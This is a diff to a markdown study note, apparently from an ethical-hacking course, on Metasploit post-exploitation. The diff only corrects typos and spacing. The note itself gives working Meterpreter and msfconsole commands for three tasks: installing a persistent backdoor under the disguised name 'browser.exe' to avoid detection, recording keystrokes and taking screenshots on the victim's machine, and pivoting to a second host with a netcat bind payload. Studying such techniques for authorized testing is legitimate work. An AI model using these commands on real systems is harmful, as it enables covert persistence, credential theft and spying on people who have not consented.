@@ -1,17 +1,15 @@
 # Post connection attacks
 -   attacks after connections to the victim's machine using metasploit in meterpreter console
 
-
 ## Maintaining access
 -   How to maintain access after getting one through backdoor and Metasploit:
     1)  Use a handler, which is a service to generate the backdoor payload. For example `c/meterpreter/rev_http_service`. This way the backdoor will install as service to the victims machine and it will run whenever he will run the machine. This doesn't always work.
-    2)  Inject our created backdoor payload and inject to the services manually in meterpreter after gaining the access to the victims machine:
-
+    2)  Inject our created backdoor payload and inject to the services manually in meterpreter after gaining the access to the victim’s machine:
 
 ```bash
 backgroud # in meterspreter make the connection run in the bg
 sessions -l # get list of sessions
-use exploit/windows/local/persistence # switch handler in msf exploit(handler), after running should showup msf exploit(persistence)
+use exploit/windows/local/persistence # switch handler in msf exploit(handler), after running should show up msf exploit(persistence)
 show options
 set EXE_NAME browser.exe # this is name of our backdoor, which will show up under the processes, using something like browser is less detectable
 set SESSION 2 # set this to session id which should the exploit run on
@@ -20,8 +18,8 @@ set EXE::Custom /var/html/backdoor.exe # set the path to the payload which shoul
 show advanced # check if set right
 exploit
 ```
--   after running exploit in this case it uploads the /var/html/backdoor.exe to the victim's machine in set session (2) and installs it.
--   also will show "clean up Meterpreter", which allows to delete the backdoor from the victim's machine, which should be used after not needing the access anymore. Could look like `/root/.msf4/logs/persistence/MSEGEWIN10_2020612/MSEGEWIN10_2020612.2445.rc`
+-   after running exploit in this case, it uploads the /var/html/backdoor.exe to the victim's machine in set session (2) and installs it.
+-   also, will show "clean up Meterpreter", which allows to delete the backdoor from the victim's machine, which should be used after not needing the access anymore. Could look like `/root/.msf4/logs/persistence/MSEGEWIN10_2020612/MSEGEWIN10_2020612.2445.rc`
 -   to test the right setup:
 ```bash
 sessions -K # kill all the sessions
@@ -31,7 +29,6 @@ show options # check if set correctly, otherwise set LPORT and LHOST as needed
 exploit     # victim's pc should automatically connect now
 ```
 
-
 ## Capturing keystrokes and screenshots
 In meterpreter:
 ```bash
@@ -40,7 +37,6 @@ keyscan_dump # print all the captured key strikes. It is organized and it shows 
 keyscan_stop # stop recording
 screenshot # get screenshot
 ```
-
 
 ## Pivoting
 -   use the hacked device as pivot to try to get access to other devices in the network
@@ -72,4 +68,4 @@ set PAYLOAD cmd/unix/bind_netcat
 show options
 exploit
 ```
--   this will connect Kali machine to the 2nd victims machine
+-   this will connect Kali machine to the 2nd victim’s machine
